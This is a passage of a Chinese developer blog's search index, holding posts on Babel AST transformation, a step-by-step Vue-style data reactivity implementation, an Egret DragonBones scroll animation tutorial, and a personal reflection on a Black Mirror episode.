title=\"通过AST对代码进行改造\"></a>通过AST对代码进行改造</h2><p><code>抽象语法树是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构</code></p>\n<blockquote>\n<p>功能</p>\n</blockquote>\n<p>通过 AST 可以实现很多非常有用的功能，例如将 ES6 以后的代码转为 ES5，eslint 的检查，代码美化，甚至 js 引擎都是依赖 AST 实现的，同时因为代码本质只是单纯的字符串，所以并不仅限于 js 之间的转换，scss，less 等 css 预处理器也是通过 AST 转为浏览器认识的 css 代码</p>\n<blockquote>\n<p>起步</p>\n</blockquote>\n<ul>\n<li>step1</li>\n</ul>\n<p><code>npm install @babel/parser @babel/traverse @babel/types @babel/core --save-dev</code></p>\n","categories":["js"],"tags":["js"]},{"title":"戴尔卡耐基-人性的弱点","url":"http://zhoushaw.github.io/2019/07/18/other/life/人性的弱点/","content":"<div><a id=\"more\"></a></div>\n\n","categories":["life"],"tags":["life"]},{"title":"vue技术内幕-数据响应系统","url":"http://zhoushaw.github.io/2019/06/17/learning/font-end/vue/vue-data-reactive/","content":"<h2 id=\"数据响应系统的基本思路\"><a href=\"#数据响应系统的基本思路\" class=\"headerlink\" title=\"数据响应系统的基本思路\"></a>数据响应系统的基本思路</h2><p>我们都知道在<code>Vue</code>中存在<code>watch</code>(观察者)。通过设置<code>watch</code>可以对数据进行观察，当数据发生变化时，可以执行对应的观察函数，下面为例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var ins = new Vue(&#123;</span><br><span class=\"line\">    data () &#123;</span><br><span class=\"line\">        return &#123;</span><br><span class=\"line\">            name: &apos;shaw&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">ins.$watch(&apos;name&apos;, ()=&gt;&#123;</span><br><span class=\"line\">    console.log(&apos;name数据发生修改&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，当我们使用<code>ins.name=&#39;zhou shaw&#39;</code>进行修改数据时，控制台会输出<code>name数据发生修改</code>,现在我们将功能抽象出来：</p>\n<blockquote>\n<p>假设我们有一个数据data</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>函数$watch,接收两个参数(要观测的key，回调函数)</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$watch(key,()=&gt;&#123;...&#125;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>实现的抽象功能</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">$watch(&apos;name&apos;,()=&gt;&#123;</span><br><span class=\"line\">    console.log(&apos;name 值发生更改&apos;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">data.name = &apos;zhou shaw&apos;;</span><br><span class=\"line\"># log： name 值发生更改</span><br></pre></td></tr></table></figure>\n<p>我们通过<code>$watch</code>函数来添加<code>data</code>对象数据的依赖关系，若<code>data</code>中的数据发生改变时出发对应<code>watch</code>函数。实现这样一个功能说复杂也复杂说简单也简单，说复杂是因为我们需要考虑到很多便捷情况、如重复依赖、深度观测，以及如何处理数组等多种情况。我们暂且不考虑这些边界情况，来实现一个简单的响应式系统。</p>\n<p>首先我们需要面临的第一个问题就是，如何检测数据发生了变化，我们可以通过<code>Object.defineProperty</code>来对属性进行检测：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Object.defineProperty(data,&apos;name&apos;, &#123;</span><br><span class=\"line\">    set (newValue) &#123;</span><br><span class=\"line\">        console.log(&apos;name 值发生更改&apos;);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    get () &#123;</span><br><span class=\"line\">        console.log(&apos;读取了属性name&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>通过<code>defineProperty</code>定义我们劫持了data对象的name属性操作，我们可以将劫持的方法封装至<code>watch</code>方法中，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">$watch = function (key, fn) &#123;</span><br><span class=\"line\">    Object.defineProperty(data,&apos;name&apos;, &#123;</span><br><span class=\"line\">        set (newValue) &#123;</span><br><span class=\"line\">            fn();</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        get () &#123;</span><br><span class=\"line\">            console.log(&apos;读取了属性name&apos;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的代码已经简单实现了对数据的观测，但是大家不难发现其中存在的问题，上面例子中<code>set</code>函数并未设置属性新的赋值，并且<code>get</code>函数并未返回获取的值会导致属性的设置和获取失效。并且上面的例子，我们我无法对一个对象的属性收集多个依赖，并且我们每次调用<code>watch</code>都对属性重新定义了<code>set</code>和<code>get</code>,当属性还存在其他依赖时这样会覆盖原有的依赖，我们不妨展开🤔，<code>set</code>函数可以用于触发数据数据发生变化，我们可不可以通过<code>get</code>函数来进行依赖收集呢</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;,</span><br><span class=\"line\">    age: 23</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">let Target;</span><br><span class=\"line\"></span><br><span class=\"line\">let dep = [];</span><br><span class=\"line\"></span><br><span class=\"line\">let val = data[&apos;name&apos;];</span><br><span class=\"line\">Object.defineProperty(data, &apos;name&apos;, &#123;</span><br><span class=\"line\">    set(newValue) &#123;</span><br><span class=\"line\">        // 设置新值与旧值相等，不进行依赖</span><br><span class=\"line\">        if (val === newValue) return;</span><br><span class=\"line\">        val = newValue</span><br><span class=\"line\">        // 执行依赖</span><br><span class=\"line\">        dep.forEach(fn =&gt; fn());</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    get() &#123;</span><br><span class=\"line\">        // 有依赖进行收集</span><br><span class=\"line\">        if (Target) dep.push(Target);</span><br><span class=\"line\">        return val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$watch = function (key,fn) &#123;</span><br><span class=\"line\">    Target = fn;</span><br><span class=\"line\">    data[key];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$watch(&apos;name&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;设置了name&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">$watch(&apos;name&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;多重依赖，啦啦啦&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">data.name = &apos;zhou shaw&apos;;</span><br></pre></td></tr></table></figure>\n<p>上述代码并未对其<code>data</code>属性进行数据响应，我们可以通过遍历添加依赖关系。并且我们会发现若我们通过访问数据便收集了依赖，那么会触发大量的重复依赖收集后面我们会讲解如何解决：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;,</span><br><span class=\"line\">    age: 23</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">let Target; // 用于缓存依赖函数</span><br><span class=\"line\"></span><br><span class=\"line\">for (let key in data) &#123;</span><br><span class=\"line\">    let dep = [];</span><br><span class=\"line\">    let val = data[key];</span><br><span class=\"line\">    Object.defineProperty(data, key, &#123;</span><br><span class=\"line\">        set(newValue) &#123;</span><br><span class=\"line\">            if (val === newValue) return; // 设置新值与旧值相等，不进行依赖</span><br><span class=\"line\">            val = newValue</span><br><span class=\"line\">            dep.forEach(fn =&gt; fn()); // 执行依赖</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        get() &#123;</span><br><span class=\"line\">            if (Target) dep.push(Target); // 有依赖进行收集</span><br><span class=\"line\">            return val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let $watch = function (key,fn) &#123;</span><br><span class=\"line\">    Target = fn;</span><br><span class=\"line\">    data[key];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但如果数据结构是这样呢：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;,</span><br><span class=\"line\">    infos: &#123;</span><br><span class=\"line\">        phone: &apos;17xxx&apos;,</span><br><span class=\"line\">        wechat: &apos;xxx&apos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>我们会发现我们并没有对深层次对象监听，如果数据结构更为复杂呢，我们可以将数据拦截方法封装成一个函数，对数据对象进行递归遍历，将所有属性都添加依赖，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">let Target; // 用于缓存依赖函数</span><br><span class=\"line\"></span><br><span class=\"line\">function walk(data) &#123;</span><br><span class=\"line\">    for (let key in data) &#123;</span><br><span class=\"line\">        let dep = [];</span><br><span class=\"line\">        let val = data[key];</span><br><span class=\"line\">        // 当数据为对象类型时递归遍历</span><br><span class=\"line\">        if (Object.prototype.toString.call(val) === &apos;[object Object]&apos;) &#123; </span><br><span class=\"line\">            walk(val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        Object.defineProperty(data, key, &#123;</span><br><span class=\"line\">            set(newValue) &#123;</span><br><span class=\"line\">                if (val === newValue) return; // 设置新值与旧值相等，不进行依赖</span><br><span class=\"line\">                val = newValue</span><br><span class=\"line\">                dep.forEach(fn =&gt; fn()); // 执行依赖</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            get() &#123;</span><br><span class=\"line\">                if (Target) dep.push(Target); // 有依赖进行收集</span><br><span class=\"line\">                return val;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">walk(data);</span><br><span class=\"line\"></span><br><span class=\"line\">let $watch = function (key,fn) &#123;</span><br><span class=\"line\">    Target = fn;</span><br><span class=\"line\">    data[key];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>尽管对数据进行深度观察了，但我们会发现，我们的<code>watch</code>函数并不会对<code>infos.wechat</code>进行观察，所以我们需要对<code>$watch</code>函数进行改造，让其支持<code>infos.wechat</code>依赖收集，所以我们想实现的效果是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$watch(&apos;infos.wechat&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;修改了wechat&apos;);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>由于我们已经实现了数据进行访问即可收集依赖，但我们无法直接通过<code>infos.wechat</code>收集，我们需要将其转换成<code>data[&#39;infos&#39;][&#39;wechat&#39;]</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var data = &#123;</span><br><span class=\"line\">    name: &apos;shaw&apos;,</span><br><span class=\"line\">    infos: &#123;</span><br><span class=\"line\">        wechat: &apos;466&apos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">let $watch = function (key,fn) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Target = fn;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (/\\./.test(key)) &#123;</span><br><span class=\"line\">        let paths = key.split(&apos;.&apos;);</span><br><span class=\"line\">        let obj = data;</span><br><span class=\"line\">        paths.forEach((path) =&gt; &#123;</span><br><span class=\"line\">            obj = obj[path];</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    data[key];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>到这里为止我们已经实现了一个简单的数据依赖收集系统，我们如何实现dom节点和数据绑定式渲染呢，在vue中模板最终都会生成一个render函数，通过这个函数来实现最终的渲染。若<code>render</code>函数中访问了<code>data</code>数据，我们可以观察<code>render</code>函数中的data数据，若<code>render</code>函数中访问的数据发生变化，则执行<code>render</code>函数进行重新渲染，那么如何收集<code>render</code>函数中访问的依赖，并将<code>render</code>函数与数据建立联系呢，很简单我们将<code>watch</code>函数进行改造一下就行了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let $watch = function (exp,fn) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Target = fn;</span><br><span class=\"line\">    if (typeof exp===&quot;function&quot;) &#123;</span><br><span class=\"line\">        exp();</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (/\\./.test(exp)) &#123;</span><br><span class=\"line\">        let paths = exp.split(&apos;.&apos;);</span><br><span class=\"line\">        let obj = data;</span><br><span class=\"line\">        paths.forEach((path) =&gt; &#123;</span><br><span class=\"line\">            obj = obj[path];</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    data[exp];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function render() &#123;</span><br><span class=\"line\">    return document.write(`姓名：$&#123;data.name&#125;; 年龄：$&#123;data.age&#125;&lt;br/&gt;`)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$watch(render, render)</span><br></pre></td></tr></table></figure>\n<p>在这里我们将<code>$watch</code>函数进行了改造，我们将第一个参数的表达是进行了类型判断，如果是函数类型进行执行。因为我们是通过<code>get</code>拦截进行依赖收集的，执行函数后可以收集<code>render</code>函数中数据的依赖，依赖的执行函数就是<code>render</code>，若我们对<code>render</code>函数中依赖的data数据进行修改，就会触发<code>render</code>函数从而实现数据响应视图。当然这里的实现只是vue的基本原理，从这里我们不难看出我们实现的这个简陋的响应系统中存在的问题，当修改数据触发<code>render</code>函数时，又进行了重复的依赖收集，并且这里也没有针对<code>Object.defineProperty</code>属性无法对数组进行观察进行处理。接下来会针对这一系列问题进行处理</p>\n","categories":["vue"],"tags":["vue"]},{"title":"《黑镜》圣诞特别篇：人间地狱","url":"http://zhoushaw.github.io/2019/06/14/other/life/黑镜-圣诞特别篇/","content":"<div><a id=\"more\"></a></div>\n\n\n<h2 id=\"故事简介\"><a href=\"#故事简介\" class=\"headerlink\" title=\"故事简介\"></a>故事简介</h2><p>　圣诞节将至，一间地处偏远的小木屋里，波特（拉菲·斯波 Rafe Spall 饰）和马特（乔恩·哈姆 Jon Hamm 饰）同坐一桌，用红酒和烤土豆庆祝这个银装素裹的节日。波特沉默寡言，无精打采，而马特却恰恰相反，为了逗波特讲话，他向波特讲述了自己的过去。<br>　　曾经的马特是一名“恋爱导师”，他通过摄像头和网络“远程操控”他的客户，让这些平日里无人问津的“宅男”们能够在派对山成功抱得美人归。然而，一场意外让马特决定永远离开这个他经营得风生水起的行当，此间究竟发生了什么？听了马特的叙述，波特终于决定向马特讲述自己的故事，这个故事关乎于他和他的女友，但并不完全关乎于爱情。\n　　</p>\n<h2 id=\"随笔\"><a href=\"#随笔\" class=\"headerlink\" title=\"随笔\"></a>随笔</h2><p>看完黑镜的圣诞特别篇，感到特别沉重</p>\n<p>人间有地狱吗，有！科技造就地狱，虽然影片中的科技现在还不存在，但是能真真切切的感受到与我们非常贴近，原来我们认为地狱是死后给恶人去的地方，但是科技可以将我们人类带往地狱！</p>\n<p>想象你被全世界所有人屏蔽，你无法与其他人交流你看到的其他人一团模糊的白影，其他人也无法和你交流你也是一团影子。想象一下你的意识一分钟就是一千年，你无法做任何事情，在这千年里有一个永远关不掉的收音机，砸碎了，回头，发现还在，不停重复。这不是地狱是什么？</p>\n","categories":["life"],"tags":["life"]},{"title":"Egret实战-动态条漫","url":"http://zhoushaw.github.io/2019/05/06/learning/game/egret实战/","content":"<h2 id=\"h5活动构建思路\"><a href=\"#h5活动构建思路\" class=\"headerlink\" title=\"h5活动构建思路\"></a>h5活动构建思路</h2><p>如何制作一个类似于中国女子图鉴的项目呢。</p>\n<blockquote>\n<p>扫码访问：</p>\n</blockquote>\n<p><img width=\"200\" src=\"https://s10.mogucdn.com/mlcdn/c45406/191016_80d41jjj95ekblche4hh9f2l4lgb6_600x600.png\"></p>\n<blockquote>\n<p>主要思路</p>\n</blockquote>\n<p>通过龙骨场景动画将将所有动画做成帧动画到龙骨中，通过滑动事件来控制帧切换的位置</p>\n<blockquote>\n<p>核心实现思想：</p>\n</blockquote>\n<ul>\n<li>获取龙骨资源、并创建<code>dragonBones</code>实例对象。将龙骨场景对象添加至画布</li>\n<li>构建一个滚动容器，容器的高度为视窗大小，设置宽度设置为视窗宽度，在滚动容器中内增加填充块,填充块的高度=<strong>(总的帧数<em> 滚动距离切换一帧 </em> 时间缩放) + 视窗高度</strong></li>\n<li>创建<code>scroll</code>对象，将其设置为视窗大小，设置<code>滚动容器</code>对象为<code>scroll</code>的视域组件组件</li>\n<li>使用<code>scroll</code>监听滚动高度，计算当前滚动条占总可滚动高度的百分比=“已滚动高度/(图片高度-视窗高度)”</li>\n<li>获取<code>dragonBones</code>场景一共拥有多少帧，通过总帧数*当前百分比，得到用户滑动到当前所在帧数</li>\n</ul>\n<blockquote>\n<p>对应知识点</p>\n</blockquote>\n<ul>\n<li>滚动容器组件：<a href=\"http://developer.egret.com/cn/apidoc/index/name/eui.Scroller\" target=\"_blank\" rel=\"noopener\">eui.scroller</a></li>\n<li>龙骨动画控制：<a href=\"http://developer.egret.com/cn/apidoc/index/name/dragonBones.Animation\" target=\"_blank\" rel=\"noopener\">dragonBones.animation</a></li>\n</ul>\n<blockquote>\n<p>具体实现代码：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private timeScale: number = 2;  // 时间缩放倍数，为2时表明帧数切换放慢两倍</span><br><span class=\"line\">private frameFactor: number = 26; // 滚动一帧需要耗费的距离</span><br><span class=\"line\">private totalFrames: number = 1672; // 总得帧数</span><br><span class=\"line\">private totalPrgress: number = this.timeScale * this.frameFactor * this.totalFrames; // 总的滚动长度</span><br><span class=\"line\">private dragonBones: Common.DragonParse;</span><br><span class=\"line\"></span><br><span class=\"line\">constructor () &#123;</span><br><span class=\"line\">    // 龙骨脚手架中已添加COMMON公共方法，用来解析龙骨资源</span><br><span class=\"line\">    this.dragonBones = Common.DragonParse.getDragonParseInstance();</span><br><span class=\"line\">    this.egretFactory = this.dragonBones.getEgretFactory();</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 获取龙骨资源</span><br><span class=\"line\">    this.armatureDisplay = this.egretFactory.buildArmatureDisplay(&apos;listen_mother&apos;);</span><br><span class=\"line\">    this.addView();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private addView () :void &#123;</span><br><span class=\"line\">   // 获取视窗宽、高</span><br><span class=\"line\">   const &#123; stageWidth, stageHeight &#125; = this.stage;</span><br><span class=\"line\">   </span><br><span class=\"line\">   // 创建滚动容器和填充块</span><br><span class=\"line\">   const group = new eui.Group();</span><br><span class=\"line\">   const placeHolder = new eui.Group();</span><br><span class=\"line\"></span><br><span class=\"line\">   placeHolder.width = stageWidth;</span><br><span class=\"line\">   placeHolder.height = this.totalPrgress + stageHeight;</span><br><span class=\"line\">   group.addChild(placeHolder);</span><br><span class=\"line\"></span><br><span class=\"line\">   //创建一个Scroller</span><br><span class=\"line\">   this.scroller = new eui.Scroller();</span><br><span class=\"line\">   this.scroller.bounces = false;</span><br><span class=\"line\">   this.scroller.width = stageWidth;</span><br><span class=\"line\">   this.scroller.height = stageHeight;</span><br><span class=\"line\">   // 将group作为滚动的视域组件</span><br><span class=\"line\">   this.scroller.viewport = group;</span><br><span class=\"line\">   this.addChild(this.scroller);</span><br><span class=\"line\">   </span><br><span class=\"line\">   // 监听滚动变化</span><br><span class=\"line\">    this.scroller.addEventListener(egret.Event.CHANGE, this.onScroll, this);</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private onScroll () :void &#123;</span><br><span class=\"line\">   // 获取滚动距离，并计算滚动百分比</span><br><span class=\"line\">   const scrollV: number = this.scroller.viewport.scrollV;</span><br><span class=\"line\">   const progress: number = scrollV / this.totalPrgress;</span><br><span class=\"line\">   let curRateValue = ~~(this.totalFrames * progress);</span><br><span class=\"line\"></span><br><span class=\"line\">   this.setSwipeAndButton(curRateValue);</span><br><span class=\"line\">   this.prevFrames = curRateValue;</span><br><span class=\"line\">   </span><br><span class=\"line\">   // 将设置龙骨动画播放到指定帧数</span><br><span class=\"line\">   this.setProgress(progress);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private setProgress (progress: number) :void &#123;</span><br><span class=\"line\">   